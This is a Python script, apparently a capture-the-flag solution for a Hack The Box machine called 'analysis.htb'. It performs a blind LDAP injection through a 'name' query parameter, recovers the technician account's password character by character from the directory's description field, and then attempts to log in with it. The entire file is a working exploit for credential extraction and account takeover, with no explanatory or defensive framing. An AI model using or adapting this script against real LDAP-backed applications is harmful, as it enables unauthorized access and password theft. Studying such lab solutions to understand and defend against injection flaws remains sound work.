import requests
import urllib.parse
import string
import time

def try_login(url, email, password):
    data = {
        'username':email,
        'password':urllib.parse.unquote_plus(password),
        'login':'Login'
    }


    res = requests.post(url, data=data)
    if "Wrong Data" in res.text:
        return False

    return True

def test_payload(url, char, found_chars):
    modified_url = url.replace("{FUZZ}", urllib.parse.quote_plus(char)).replace("{found_char}", found_chars)
    print(f"Testing {char} for URL: {modified_url}")
    try:
        res = requests.get(modified_url)
        if res.status_code == 200 and "technician" in res.text:
            return True
    except requests.RequestException as e:
        print(f"Request failed: {e}")
    return False

def do_loop(url, wl, found_chars):
    for char in wl:
        char = char.strip()
        if test_payload(url, char, found_chars):
            print(f"Found char: {char}. Resetting iteration")
            found_chars += char
            return do_loop(url, wl, found_chars)
    return found_chars

def main():
    url = "http://internal.analysis.htb/Users/list.php"
    login_url = "http://internal.analysis.htb/employees/login.php"
    email = "technician@analysis.htb"
    password = ""
    max_rounds = int(input("How many rounds? "))

    wl = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*()_+=-"
    param = "?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
    base_url = url + param
    
    rounds = 1
    while rounds <= max_rounds:
        password = do_loop(base_url, wl, password)
        print(f"[*] Round {rounds} password is: '{password}'. Attempting login...")
        can_login = try_login(login_url, email, password)
        time.sleep(3)
        if can_login:
            print(f"[+] Login successful!")
            break
        print(f"[-] Round {rounds} login attempt failed with password '{password}'")
        print(f"[*] Starting round {rounds+1} assuming next character in password is '*'")
        rounds += 1
        password += "%2A"
    

    password = urllib.parse.unquote_plus(password)
    print(f"[+] Password is: '{password}'")

    return 0

if __name__ == '__main__':
    status = main()
    exit(status)

